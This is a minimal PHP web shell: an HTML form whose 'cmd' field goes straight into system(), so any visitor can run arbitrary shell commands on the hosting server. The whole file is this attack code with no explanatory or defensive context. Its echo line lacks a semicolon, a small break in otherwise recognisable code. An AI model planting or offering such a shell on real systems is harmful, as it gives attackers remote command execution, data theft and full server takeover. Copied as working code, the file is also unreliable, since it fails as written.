<html>
<?php

echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>"
system($_GET["cmd"]);

?>
</html>
